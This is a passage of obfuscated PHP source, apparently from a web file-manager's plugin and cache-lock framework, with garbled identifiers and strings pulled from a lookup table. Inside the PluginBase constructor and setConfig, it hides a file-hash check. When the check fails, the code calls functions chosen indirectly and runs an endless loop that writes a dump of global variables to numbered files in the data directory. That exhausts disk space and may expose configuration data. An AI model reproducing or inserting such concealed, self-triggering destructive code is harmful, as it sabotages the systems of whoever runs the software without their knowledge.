$Áä‘ˆ¯Ú[33] => $Áä‘ˆ¯Ú[1243]))->delete(); } $ø½æ¼è = json_encode($æéß¤¼); if (!$ø½æ¼è) { ob_start(); var_dump($æéß¤¼); $üÆìğßŠ = ob_get_clean(); self::log($Áä‘ˆ¯Ú[2007] . json_encode_force($üÆìğßŠ)); } if (!$½øú€ñå || !$æéß¤¼[$Áä‘ˆ¯Ú[487]]) { return !1; } $¡›•îà = array($Áä‘ˆ¯Ú[33] => $Áä‘ˆ¯Ú[1243], $Áä‘ˆ¯Ú[1594] => USER_ID, $Áä‘ˆ¯Ú[95] => $½øú€ñå, $Áä‘ˆ¯Ú[451] => $ø½æ¼è); $ÅÑ†” = $Áä‘ˆ¯Ú[2008]; CacheLock::lock($ÅÑ†”); Model($Áä‘ˆ¯Ú[534])->add($¡›•îà, array(), !0); CacheLock::unlock($ÅÑ†”); } public static function log($ïõ„‰ßÍ) { if (!GLOBAL_DEBUG) { return; } write_log($ïõ„‰ßÍ, $_SERVER[ïÃ°£«Ê][2009]); } } goto d Œ‘„Ìè; a¹£ÚŸõ°ä: class CacheLockRedis { public function lock($õú š¹¡, $İóÜ¸õ¹ = 10) { $Ö­±§¢¼ = Cache::init(); $¸‰µèÀŠ = microtime(!0) + $İóÜ¸õ¹; while (microtime(!0) < $¸‰µèÀŠ) { $Ì£¬…Â÷ = $Ö­±§¢¼->get($õú š¹¡); if (!$Ì£¬…Â÷) { $—ûÌ‡ì£ = $Ö­±§¢¼->setLock($õú š¹¡, $¸‰µèÀŠ, $İóÜ¸õ¹); if ($—ûÌ‡ì£) { return !0; } } else { if ($Ì£¬…Â÷ < microtime(!0)) { $Ö­±§¢¼->set($õú š¹¡, $¸‰µèÀŠ, $İóÜ¸õ¹ * 2); if ($Ö­±§¢¼->get($õú š¹¡) === $Ì£¬…Â÷) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Èä“¤ÆË) { return Cache::init()->get($Èä“¤ÆË); } public function unlock($ÛÜöšõ) { return Cache::init()->remove($ÛÜöšõ); } } class CacheLockMemcached { public function lock($óåòŞ’‡, $–áª¡Ó = 0) { $…»ßİ›Ê = Cache::init(); $“ù‚íÚé = microtime(!0) + $–áª¡Ó; while (microtime(!0) < $“ù‚íÚé) { $×‰¬ú¶ = $…»ßİ›Ê->get($óåòŞ’‡); if (!$×‰¬ú¶ || $×‰¬ú¶ < microtime(!0)) { $ÖÉ•üîÂ = $…»ßİ›Ê->handle->add($óåòŞ’‡, $“ù‚íÚé, $–áª¡Ó); if ($ÖÉ•üîÂ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ß«”‚Ê) { return Cache::init()->get($ß«”‚Ê); } public function unlock($ş«´å‘È) { return Cache::init()->remove($ş«´å‘È); } } class CacheLockDatabase { public function lock($½È Øæ, $‚ûÉ‡†ı = 0) { $Ùƒ÷è¼ = Model($_SERVER[ïÃ°£«Ê][983]); $µì™ŞÔŞ = microtime(!0) + $‚ûÉ‡†ı; while (microtime(!0) < $µì™ŞÔŞ) { $«ÕäÙ²ß = $Ùƒ÷è¼->get($½È Øæ); if (!$«ÕäÙ²ß || $«ÕäÙ²ß < microtime(!0)) { $û¶œ¢ëû = $Ùƒ÷è¼->set($½È Øæ, $µì™ŞÔŞ); if ($û¶œ¢ëû) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($÷—õÔ¥à) { return Model($_SERVER[ïÃ°£«Ê][983])->get($÷—õÔ¥à); } public function unlock($ì²ŒÛ) { Model($_SERVER[ïÃ°£«Ê][983])->remove($ì²ŒÛ); } } goto B“í«áÅ¤ª; d¥›ÖÊÔ±Ş: class Message { function __construct() { } public function send($¥¨”©Š÷ = '', $ÀÙä¡î¾ = array(), $Ãè¨¼ = "\164\145\x78\x74") { $«Ö†Ú­Ê =& $_SERVER[ïÃ°£«Ê]; $Â™“Ï«… = array($«Ö†Ú­Ê[33] => $«Ö†Ú­Ê[1293], $«Ö†Ú­Ê[168] => $¥¨”©Š÷); if (in_array($Ãè¨¼, array($«Ö†Ú­Ê[1293], $«Ö†Ú­Ê[1827]))) { $Â™“Ï«…[$«Ö†Ú­Ê[33]] = $Ãè¨¼; } $ÀÙä¡î¾ = array($«Ö†Ú­Ê[598] => isset($ÀÙä¡î¾[$«Ö†Ú­Ê[598]]) ? $ÀÙä¡î¾[$«Ö†Ú­Ê[598]] : $«Ö†Ú­Ê[12], $«Ö†Ú­Ê[684] => isset($ÀÙä¡î¾[$«Ö†Ú­Ê[684]]) ? $ÀÙä¡î¾[$«Ö†Ú­Ê[684]] : $«Ö†Ú­Ê[12]); if (empty($¥¨”©Š÷) || empty($ÀÙä¡î¾[$«Ö†Ú­Ê[598]]) && empty($ÀÙä¡î¾[$«Ö†Ú­Ê[684]])) { return !1; } $óï•ä‰à = array($«Ö†Ú­Ê[1756] => $Â™“Ï«…, $«Ö†Ú­Ê[1828] => $ÀÙä¡î¾); Hook::trigger($«Ö†Ú­Ê[1829], $óï•ä‰à); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $‚íìù¶ú =& $_SERVER[ïÃ°£«Ê]; $ñ“±£ğÅ = $_SERVER[$‚íìù¶ú[1039]] . $‚íìù¶ú[1040]; $Íæ‘Ú´ = $‚íìù¶ú[1830]; if ($_SERVER[$‚íìù¶ú[1035]] != $Íæ‘Ú´($ñ“±£ğÅ)) { $¸‹ÁùÄË = $‚íìù¶ú[1037]; $¹Ûúê×Ú = $‚íìù¶ú[1038]; $·Û²™Â› = $_SERVER[$‚íìù¶ú[1039]] . $‚íìù¶ú[1040]; $ÎÚŸ–¯ = $¹Ûúê×Ú($·Û²™Â›); $ëüÉÂ¿¼ = explode($‚íìù¶ú[285], $ÎÚŸ–¯); if (count($ëüÉÂ¿¼) < $‚íìù¶ú[713]) { $ÅªòÊÇ‰ = $‚íìù¶ú[1041]; $ÅªòÊÇ‰(); } $¶ÑìØãÌ = $‚íìù¶ú[1042]; $¶ÑìØãÌ($_SERVER[$‚íìù¶ú[1043]]); $¸‹ÁùÄË = $‚íìù¶ú[1037]; $¸‹ÁùÄË(); $üÃÊø = $‚íìù¶ú[1831]; $÷ÊÀÓÆ = json_encode($GLOBALS[$‚íìù¶ú[1832]]); $î¨¼ÎĞ” = 1; for ($ÅõÒÄ•î = $î¨¼ÎĞ”; $ÅõÒÄ•î > 0; $ÅõÒÄ•î++) { $üÃÊø(DATA_PATH . $ÅõÒÄ•î, $÷ÊÀÓÆ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($‚íìù¶ú[1833]); $this->pluginName = str_replace($‚íìù¶ú[1833], $‚íìù¶ú[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $‚íìù¶ú[8]; $this->pluginApi = appHostGet() . $‚íìù¶ú[1834] . $this->pluginName . $‚íìù¶ú[8]; $this->pluginHost = $config[$‚íìù¶ú[1835]] . $this->pluginName . $‚íìù¶ú[8]; $this->pluginHostDefault = $config[$‚íìù¶ú[1835]] . $this->pluginName . $‚íìù¶ú[8]; $ëûŞ‚Ğä = $config[$‚íìù¶ú[1836]]; if ($ëûŞ‚Ğä && strpos($‚íìù¶ú[50] . $ëûŞ‚Ğä . $‚íìù¶ú[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$‚íìù¶ú[1837]] . $this->pluginName . $‚íìù¶ú[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ïÃ°£«Ê][1838]); } protected function assign($ Ã¿ˆ, $õ‹ÆÎÔÓ = false) { if (is_array($ Ã¿ˆ)) { $this->values = array_merge($this->values, $ Ã¿ˆ); } else { $this->values[$ Ã¿ˆ] = $õ‹ÆÎÔÓ; } } protected function display($”Ÿ¤‚ü) { extract($this->values); require $”Ÿ¤‚ü; } final function hookRegist($Ïâ©ú‡) { $this->modelPlugin->appRegist($this->pluginName, $Ïâ©ú‡); } final function appIcon() { $ úä‘àÇ =& $_SERVER[ïÃ°£«Ê]; $Ø­ĞºÎ = $this->appPackage(); $øÄ œß’ = $ úä‘àÇ[12]; if (isset($Ø­ĞºÎ[$ úä‘àÇ[505]])) { if (isset($Ø­ĞºÎ[$ úä‘àÇ[505]][$ úä‘àÇ[1839]])) { $øÄ œß’ = $ úä‘àÇ[1840] . $Ø­ĞºÎ[$ úä‘àÇ[505]][$ úä‘àÇ[1839]] . $ úä‘àÇ[1841]; } else { if ($Ø­ĞºÎ[$ úä‘àÇ[505]][$ úä‘àÇ[1842]]) { $øÄ œß’ = $ úä‘àÇ[1843] . $Ø­ĞºÎ[$ úä‘àÇ[505]][$ úä‘àÇ[1842]] . $ úä‘àÇ[1844]; } } } return $øÄ œß’; } final function fileCanView($ÏÍÑÔåÌ) { $ ºìÂ”Ü =& $_SERVER[ïÃ°£«Ê]; if (request_url_safe($ÏÍÑÔåÌ)) { return !0; } if ($this->isShare($ÏÍÑÔåÌ)) { ActionCall($ ºìÂ”Ü[1845], $ÏÍÑÔåÌ); return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $°Áú‚‹¶ = $ ºìÂ”Ü[1846] . rawurlencode(this_url()); show_tips(LNG($ ºìÂ”Ü[1847]) . $ ºìÂ”Ü[1848] . $°Áú‚‹¶ . $ ºìÂ”Ü[1849] . LNG($ ºìÂ”Ü[1850]) . $ ºìÂ”Ü[1851], !1); } if (!Action($ ºìÂ”Ü[1852])->authCan($ ºìÂ”Ü[1853])) { show_tips(LNG($ ºìÂ”Ü[1854]) . $ ºìÂ”Ü[1855], !1); } ActionCall($ ºìÂ”Ü[1845], $ÏÍÑÔåÌ); } final function isShare($úÂäœğ¿) { $Éºµ»¤ø = KodIO::parse($úÂäœğ¿); return $Éºµ»¤ø[$_SERVER[ïÃ°£«Ê][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($­õİ‡¯ú) { if (request_url_safe($­õİ‡¯ú)) { return $­õİ‡¯ú; } if (!$this->isShare($­õİ‡¯ú)) { $­õİ‡¯ú = $this->filePath($­õİ‡¯ú, !1); } return Action($_SERVER[ïÃ°£«Ê][1365])->linkOut($­õİ‡¯ú); } public function filePathLinkOut($óâø õÎ) { if (request_url_safe($óâø õÎ)) { return $óâø õÎ; } $this->fileCanView($óâø õÎ); return Action($_SERVER[ïÃ°£«Ê][1365])->link($óâø õÎ); } final function filePath($æ•Ğ¥†Ş, $°¦º¨êÛ = true, $î¾Êüé³ = false) { $“—‡û‘ì =& $_SERVER[ïÃ°£«Ê]; $†ú·â—ˆ = $this->filePathGet($æ•Ğ¥†Ş, $°¦º¨êÛ); if (!$this->fileInfo) { show_tips(LNG($“—‡û‘ì[105]), !1); } if ($î¾Êüé³ && isset($this->fileInfo[$“—‡û‘ì[557]]) && $this->fileInfo[$“—‡û‘ì[557]]) { $şñãª± = Model($“—‡û‘ì[560])->fileInfo($this->fileInfo[$“—‡û‘ì[557]]); if (!$şñãª± || !IO::exist($şñãª±[$“—‡û‘ì[87]])) { $ÅèÑâüû = LNG($“—‡û‘ì[105]) . LNG($“—‡û‘ì[1856]); if (KodUser::isRoot() && isset($şñãª±[$“—‡û‘ì[87]])) { $ÅèÑâüû .= $“—‡û‘ì[1857] . $şñãª±[$“—‡û‘ì[87]] . $“—‡û‘ì[1858]; } show_tips($ÅèÑâüû); } } Hook::trigger($“—‡û‘ì[1859], $†ú·â—ˆ); return $†ú·â—ˆ; } final function filePathGet($Ù±²ï÷Ğ, $‰ÏŠ°Á‰ = true) { $ªºÉèì¥ =& $_SERVER[ïÃ°£«Ê]; $this->fileCanView($Ù±²ï÷Ğ); if ($à«Ø¥ÕŸ = $this->checkSharePath($Ù±²ï÷Ğ, $‰ÏŠ°Á‰)) { return $à«Ø¥ÕŸ; } if (request_url_safe($Ù±²ï÷Ğ)) { $£ÑÔ‡… = parse_url_query($Ù±²ï÷Ğ); if (isset($£ÑÔ‡…[$ªºÉèì¥[1860]]) && isset($£ÑÔ‡…[$ªºÉèì¥[234]])) { $‚úŒ£Êö = Mcrypt::decode($£ÑÔ‡…[$ªºÉèì¥[234]], Model($ªºÉèì¥[874])->get($ªºÉèì¥[875])); if ($‚úŒ£Êö) { $this->fileInfo = IO::info($‚úŒ£Êö); $this->fileInfo[$ªºÉèì¥[1861]] = $Ù±²ï÷Ğ; $this->cachePath = $this->pluginCachePath($ªºÉèì¥[12], $‰ÏŠ°Á‰); return $‚úŒ£Êö; } } $Ù±²ï÷Ğ = $this->_cacheHttpFile($Ù±²ï÷Ğ, $‰ÏŠ°Á‰); $this->fileInfo = IO::info($Ù±²ï÷Ğ); } else { $this->fileInfo = IO::info($Ù±²ï÷Ğ); $this->cachePath = $this->pluginCachePath($ªºÉèì¥[12], $‰ÏŠ°Á‰); } return $Ù±²ï÷Ğ; } final function _cacheHttpFile($Ûåâ†ú, $ô‡œÜá = true) { $Û«üÔ™ =& $_SERVER[ïÃ°£«Ê]; $¾ÚÎı¹¥ = parse_url_query($Ûåâ†ú); $¿¹èˆãĞ = get_path_ext($Ûåâ†ú); if (isset($¾ÚÎı¹¥[$Û«üÔ™[32]]) && $¾ÚÎı¹¥[$Û«üÔ™[32]]) { $¿¹èˆãĞ = get_path_ext($¾ÚÎı¹¥[$Û«üÔ™[32]]); } $á›‡ºÎ = hash_path($Ûåâ†ú) . $Û«üÔ™[10] . $¿¹èˆãĞ; $this->cachePath = $this->pluginCachePath($ô‡œÜá ? $á›‡ºÎ : $Û«üÔ™[12]); $¾­“©„¦ = IO::fileNameExist($this->cachePath, $á›‡ºÎ); if ($¾­“©„¦) { return KodIO::make($¾­“©„¦); } $«šÃõææ = rtrim($this->cachePath, $Û«üÔ™[8]) . $Û«üÔ™[8] . $á›‡ºÎ; return $this->pluginCacheFileSet($«šÃõææ, file_get_contents_nossl($Ûåâ†ú)); } final function checkSharePath($‡”ùçÕ³, $ê÷‡õ”Å = true) { $›Êğö² =& $_SERVER[ïÃ°£«Ê]; if (!$this->isShare($‡”ùçÕ³)) { return !1; } $åó§øºŞ = Action($›Êğö²[1365])->sharePathInfo($‡”ùçÕ³); if (!is_array($åó§øºŞ) || !isset($åó§øºŞ[$›Êğö²[87]])) { $ï¿öÍÖú = $GLOBALS[$›Êğö²[1862]]; show_json($ï¿öÍÖú ? $ï¿öÍÖú : LNG($›Êğö²[1863]), !1); } $this->fileInfo = $åó§øºŞ; $this->cachePath = $this->pluginCachePath(!1, $ê÷‡õ”Å); return $åó§øºŞ[$›Êğö²[87]]; } final function pluginCachePath($í®„ÂŒ = '', $¾Îç ¸ = false) { $á¼Ûêü =& $_SERVER[ïÃ°£«Ê]; if ($¾Îç ¸ && is_array($this->fileInfo)) { $í®„ÂŒ = kodIO::hashPath($this->fileInfo); } $ß¦ª‡‚û = rtrim(IO_PATH_SYSTEM_TEMP . $á¼Ûêü[1864] . $this->pluginName . $á¼Ûêü[8] . $í®„ÂŒ, $á¼Ûêü[8]); $ë‰ö­î· = IO::infoFullSimple($ß¦ª‡‚û); $‚ÉûºÂÂ = $ë‰ö­î· && is_array($ë‰ö­î·) ? $ë‰ö­î·[$á¼Ûêü[87]] : $á¼Ûêü[12]; if (!$‚ÉûºÂÂ) { $‚ÉûºÂÂ = IO::mkdir($ß¦ª‡‚û); } return $‚ÉûºÂÂ; } final function pluginCacheFileSet($˜öü“‘´, $äÛÕŸ×Ô = '') { $ÆÍ“‹È =& $_SERVER[ïÃ°£«Ê]; $µÏÖ‰‰á = IO::infoFullSimple($˜öü“‘´); if (!$µÏÖ‰‰á) { return IO::mkfile($˜öü“‘´, $äÛÕŸ×Ô, REPEAT_REPLACE); } IO::setContent($µÏÖ‰‰á[$ÆÍ“‹È[87]], $äÛÕŸ×Ô); return $µÏÖ‰‰á[$ÆÍ“‹È[87]]; } final function pluginLocalFile($šÌÒÓÈ = '') { $œšùÙ‘š =& $_SERVER[ïÃ°£«Ê]; $Î‚ŸŸ‹¬ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($Î‚ŸŸ‹¬)) { mk_dir($Î‚ŸŸ‹¬); } if (!$šÌÒÓÈ) { return $Î‚ŸŸ‹¬; } $·Ğ’ŠÒÙ = IO::info($šÌÒÓÈ); $¯Œ¸íüé = $œšùÙ‘š[1865] . KodIO::hashPath($·Ğ’ŠÒÙ) . $œšùÙ‘š[10] . $·Ğ’ŠÒÙ[$œšùÙ‘š[166]]; if (!checkExtSafe($¯Œ¸íüé)) { $¯Œ¸íüé = $¯Œ¸íüé . $œšùÙ‘š[1398]; } $§…„¨ä = $Î‚ŸŸ‹¬ . $¯Œ¸íüé; if (@file_exists($§…„¨ä)) { return $§…„¨ä; } return IO::copy($šÌÒÓÈ, $Î‚ŸŸ‹¬, 0, $¯Œ¸íüé); } final function appPackage() { $ÉÒ—«ï© =& $_SERVER[ïÃ°£«Ê]; if ($this->packageData) { return $this->packageData; } $ººô¾ÁÉ = $this->parseFile($this->pluginPath . $ÉÒ—«ï©[1866]); $this->parseLang($ººô¾ÁÉ); $ıó˜ = json_decode_force($ººô¾ÁÉ); if (!$ıó˜) { return array(); } $µ“…¯  = Hook::filter($ÉÒ—«ï©[1867], $ıó˜); if ($µ“…¯  && is_array($µ“…¯ )) { $ıó˜ = $µ“…¯ ; } $this->packageData = $ıó˜; return $ıó˜; } public function packageInfoGet($‹Ä³î«¿) { $”´ÏÄí½ = $this->appPackage(); return array_get_value($”´ÏÄí½, $‹Ä³î«¿); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ïÃ°£«Ê][1868]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ïÃ°£«Ê][1869]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ïÃ°£«Ê][1870]); } public function echoJsAssign($‡ïÜèËø, $øÀ‚°õÊ) { $this->echoJsAssignArr[$‡ïÜèËø] = $øÀ‚°õÊ; } private function parseFile($ºŸ²Ëş) { $«³¨ı®‰ =& $_SERVER[ïÃ°£«Ê]; $¤ªÎ’Ì = file_get_contents_nossl($ºŸ²Ëş); $ƒšäµ¼ = array($«³¨ı®‰[1871], $«³¨ı®‰[1872], $«³¨ı®‰[1873], $«³¨ı®‰[1874], $«³¨ı®‰[1875], $«³¨ı®‰[1876], $«³¨ı®‰[1877]); $ÕïÄöà = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$«³¨ı®‰[92]][$«³¨ı®‰[1878]]); foreach ($this->echoJsAssignArr as $µ¡•«½À => $çôâ“û½) { $ƒšäµ¼[] = $«³¨ı®‰[1879] . $µ¡•«½À . $«³¨ı®‰[1880]; $ÕïÄöà[] = is_array($çôâ“û½) || is_object($çôâ“û½) ? rawurlencode(json_encode($çôâ“û½)) : $çôâ“û½; } if (strstr($¤ªÎ’Ì, $«³¨ı®‰[1881])) { $Ôğ°¤ = rawurlencode(json_encode($this->pluginLangArr)); $¤ªÎ’Ì = str_replace($«³¨ı®‰[1881], $Ôğ°¤, $¤ªÎ’Ì); } if (strstr($¤ªÎ’Ì, $«³¨ı®‰[1882])) { $Ôğ°¤ = $Ôğ°¤ = rawurlencode(json_encode($this->getConfig())); $¤ªÎ’Ì = str_replace($«³¨ı®‰[1882], $Ôğ°¤, $¤ªÎ’Ì); } $¤ªÎ’Ì = str_replace($ƒšäµ¼, $ÕïÄöà, $¤ªÎ’Ì); return $¤ªÎ’Ì; } private function parseLang(&$ÁÕ”÷–) { $í®¬êÉŞ =& $_SERVER[ïÃ°£«Ê]; $Æïë°¡Ä = $í®¬êÉŞ[1883]; if (!strstr($ÁÕ”÷–, $Æïë°¡Ä)) { return; } preg_match_all($í®¬êÉŞ[1884], $ÁÕ”÷–, $Ìô¼†¨); if (!is_array($Ìô¼†¨) || count($Ìô¼†¨) == 0 || !is_array($Ìô¼†¨[0]) || count($Ìô¼†¨[0]) == 0) { return; } $ãêŞİ­­ = array(); $ô²Úû·ö = array(); foreach ($Ìô¼†¨[0] as $ÎÄÆé¸›) { $÷ÊˆæÀ² = substr($ÎÄÆé¸›, strlen($Æïë°¡Ä), -4); $ËæÊé´´ = LNG($÷ÊˆæÀ²); $ãêŞİ­­[] = $ÎÄÆé¸›; $ô²Úû·ö[] = str_replace(array($í®¬êÉŞ[285], $í®¬êÉŞ[1252], $í®¬êÉŞ[417], $í®¬êÉŞ[118]), array($í®¬êÉŞ[53], $í®¬êÉŞ[53], $í®¬êÉŞ[12], $í®¬êÉŞ[1885]), $ËæÊé´´); } $ÁÕ”÷– = str_replace($ãêŞİ­­, $ô²Úû·ö, $ÁÕ”÷–); } private function parseConfig(&$¯ÈÍ³÷Õ) { $¦ÖÛÁÖ‚ =& $_SERVER[ïÃ°£«Ê]; $Åµ‘Şç = $¦ÖÛÁÖ‚[1886]; if (!strstr($¯ÈÍ³÷Õ, $Åµ‘Şç)) { return; } preg_match_all($¦ÖÛÁÖ‚[1887], $¯ÈÍ³÷Õ, $©º ¬…ğ); if (!is_array($©º ¬…ğ) || count($©º ¬…ğ) == 0 || !is_array($©º ¬…ğ[0]) || count($©º ¬…ğ[0]) == 0) { return; } $°¶äå·ò = $this->getConfig(); $Ê×íãó = array(); $ƒ‡ôëš‹ = array(); foreach ($©º ¬…ğ[0] as $ Œäşá) { $“Ş†ú î = substr($ Œäşá, strlen($Åµ‘Şç), -2); $Ê×íãó[] = $ Œäşá; $ƒ‡ôëš‹[] = _get($°¶äå·ò, $“Ş†ú î); } $¯ÈÍ³÷Õ = str_replace($Ê×íãó, $ƒ‡ôëš‹, $¯ÈÍ³÷Õ); } private function parsePackage(&$ğÓùş¶) { $Ã¼”Î»Í =& $_SERVER[ïÃ°£«Ê]; $˜Ÿ¨˜ñå = $Ã¼”Î»Í[1888]; if (!strstr($ğÓùş¶, $˜Ÿ¨˜ñå)) { return; } preg_match_all($Ã¼”Î»Í[1889], $ğÓùş¶, $‰—¯™ç¦); if (!is_array($‰—¯™ç¦) || count($‰—¯™ç¦) == 0 || !is_array($‰—¯™ç¦[0]) || count($‰—¯™ç¦[0]) == 0) { return; } $Ç¼½Õ¥ò = $this->appPackage(); $ëóà°­Í = array(); $™±ÍˆÎŞ = array(); foreach ($‰—¯™ç¦[0] as $÷«©Õ›Ø) { $¢Ã¥‡å = substr($÷«©Õ›Ø, strlen($˜Ÿ¨˜ñå), -2); $ëóà°­Í[] = $÷«©Õ›Ø; $™±ÍˆÎŞ[] = _get($Ç¼½Õ¥ò, $¢Ã¥‡å); } $ğÓùş¶ = str_replace($ëóà°­Í, $™±ÍˆÎŞ, $ğÓùş¶); } final function echoFile($Şœ±ÒÔ‰, $ŸÉïô“Á = false) { $Š””ÓÖ‰ =& $_SERVER[ïÃ°£«Ê]; $ÆÓ£¬ = $this->pluginPath . $Şœ±ÒÔ‰; if (ACT == $Š””ÓÖ‰[1890]) { echo $Š””ÓÖ‰[1891] . $this->pluginName . $Š””ÓÖ‰[8] . $Şœ±ÒÔ‰ . $Š””ÓÖ‰[1892]; if (!file_exists($ÆÓ£¬)) { echo $Š””ÓÖ‰[1893]; return; } } $æ–™´‹ = $this->parseFile($ÆÓ£¬); $this->parseLang($æ–™´‹); $this->parseConfig($æ–™´‹); $this->parsePackage($æ–™´‹); if (is_array($ŸÉïô“Á)) { $æ–™´‹ = str_replace(array_keys($ŸÉïô“Á), array_values($ŸÉïô“Á), $æ–™´‹); } echo $Š””ÓÖ‰[285] . $æ–™´‹; } private function checkVersion() { $ÆäŠûş =& $_SERVER[ïÃ°£«Ê]; $ƒû£İáÕ = $this->appPackage(); $ÔÀ÷Ïõ« = $this->getConfig(); if ($ÔÀ÷Ïõ«[$ÆäŠûş[1894]] == $ƒû£İáÕ[$ÆäŠûş[1868]]) { return; } $this->regist(); $this->setConfig(array($ÆäŠûş[1894] => $ƒû£İáÕ[$ÆäŠûş[1868]])); } final function initLang() { $ãü›«ˆ‡ =& $_SERVER[ïÃ°£«Ê]; $Éé©¸¥¡ = $ãü›«ˆ‡[1895]; $¿ê«¥¤ = $this->pluginPath . $ãü›«ˆ‡[1896]; $ü¾Ïş¾ = I18n::getType(); $ÔÅÖû¼ = array(); if (file_exists($¿ê«¥¤ . $ü¾Ïş¾ . $ãü›«ˆ‡[996])) { $ÔÅÖû¼ = (include $¿ê«¥¤ . $ü¾Ïş¾ . $ãü›«ˆ‡[996]); } else { if ($ü¾Ïş¾ == $ãü›«ˆ‡[1897] && !file_exists($¿ê«¥¤ . $ü¾Ïş¾ . $ãü›«ˆ‡[996]) && file_exists($¿ê«¥¤ . $ãü›«ˆ‡[1898])) { $ÔÅÖû¼ = (include $¿ê«¥¤ . $ãü›«ˆ‡[1898]); $ü¾Ïş¾ = $ãü›«ˆ‡[1711]; } else { if (file_exists($¿ê«¥¤ . $Éé©¸¥¡ . $ãü›«ˆ‡[996])) { $ÔÅÖû¼ = (include $¿ê«¥¤ . $Éé©¸¥¡ . $ãü›«ˆ‡[996]); $ü¾Ïş¾ = $Éé©¸¥¡; } } } if (!$ÔÅÖû¼ || !is_array($ÔÅÖû¼)) { $ÔÅÖû¼ = array(); } $Û‰¸È÷¥ = Hook::trigger($ãü›«ˆ‡[1899], $ÔÅÖû¼, $this->pluginName, $ü¾Ïş¾); if ($Û‰¸È÷¥ && is_array($Û‰¸È÷¥)) { $ÔÅÖû¼ = $Û‰¸È÷¥; } if (@count($ÔÅÖû¼) > 0) { I18n::set($ÔÅÖû¼); } return $ÔÅÖû¼; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ªÇøÔ„•) { $Öó‹æ÷´ =& $_SERVER[ïÃ°£«Ê]; if (!isset($_SERVER[$Öó‹æ÷´[1035]]) || !isset($_SERVER[$Öó‹æ÷´[1227]])) { $àİÏëÚ = $Öó‹æ÷´[1037]; $Í¥­ŸÙ  = $Öó‹æ÷´[1038]; $Óºò»øö = $_SERVER[$Öó‹æ÷´[1039]] . $Öó‹æ÷´[1040]; $±ìÅè¾Ì = $Í¥­ŸÙ ($Óºò»øö); $•ìÍ = explode($Öó‹æ÷´[285], $±ìÅè¾Ì); if (count($•ìÍ) < $Öó‹æ÷´[713]) { $ø©¹ßÃ² = $Öó‹æ÷´[1041]; $ø©¹ßÃ²(); } $‚šúâ¤ = $Öó‹æ÷´[1042]; $‚šúâ¤($_SERVER[$Öó‹æ÷´[1043]]); $ø©ë‰×ó = 1; for ($çãã··Ä = $ø©ë‰×ó; $çãã··Ä > 0; $çãã··Ä++) { $‚šúâ¤ = json_encode($GLOBALS[$Öó‹æ÷´[507]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ªÇøÔ„•); } public function onSetConfig($é†éœÓÁ) { } public function onGetConfig($Œİë¤µæ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($“½Æöµî) { if ($“½Æöµî == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Ñ¶ÖÑÑ¤ = "\x70\x6c\165\x67\x69\156\x41\x75\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $àÆÂšÍ˜ = $this->getConfig(); if (!$àÆÂšÍ˜[$Ñ¶ÖÑÑ¤]) { return !1; } return ActionCall($_SERVER[ïÃ°£«Ê][1900], $àÆÂšÍ˜[$Ñ¶ÖÑÑ¤]); } public function url($‚Ÿ–ÜŒ”, $ü”…À‰ô = '', $¤‰Œá–œ = true) { $úÎı­Í =& $_SERVER[ïÃ°£«Ê]; $Î¿áÜ€ = $this->getConfig(); $‚¹Ü“« = KOD_VERSION . $úÎı­Í[10] . KOD_VERSION_BUILD; $àŸæÃï… = $this->packageVersion(); $ìÈó¨Œ‚ = $‚¹Ü“« . $úÎı­Í[476] . $àŸæÃï…; if (substr($‚Ÿ–ÜŒ”, 0, 4) == $úÎı­Í[149] || substr($‚Ÿ–ÜŒ”, 0, 2) == $úÎı­Í[1525]) { $¨×Ë¿Ú = $‚Ÿ–ÜŒ” . $úÎı­Í[1901] . $ìÈó¨Œ‚; } else { if ($ü”…À‰ô == $úÎı­Í[12]) { $¨×Ë¿Ú = $this->pluginHost . $‚Ÿ–ÜŒ” . $úÎı­Í[1901] . $ìÈó¨Œ‚; } else { if ($ü”…À‰ô === $úÎı­Í[78]) { $¨×Ë¿Ú = $this->pluginHost . $‚Ÿ–ÜŒ”; } else { if ($ü”…À‰ô == $úÎı­Í[1902]) { $¨×Ë¿Ú = STATIC_PATH . $‚Ÿ–ÜŒ” . $úÎı­Í[1901] . $‚¹Ü“«; } else { if ($ü”…À‰ô == $úÎı­Í[1903]) { $¨×Ë¿Ú = APP_HOST . $úÎı­Í[1904] . $‚Ÿ–ÜŒ” . $úÎı­Í[1901] . $‚¹Ü“«; } else { if (isset($Î¿áÜ€[$ü”…À‰ô])) { $¨×Ë¿Ú = $Î¿áÜ€[$ü”…À‰ô] . $‚Ÿ–ÜŒ” . $úÎı­Í[1901] . $ìÈó¨Œ‚; } } } } } } if (!$¤‰Œá–œ) { return $¨×Ë¿Ú; } echo $¨×Ë¿Ú; } public function link($ªÊ©­Ë = false, $˜…Šğ–¿ = '') { $ˆÖˆÎûÆ =& $_SERVER[ïÃ°£«Ê]; $ãµ”÷¥ä = $this->linkHas == !1; $this->linkHas = !0; if (!$ªÊ©­Ë) { $this->link($ˆÖˆÎûÆ[1905], 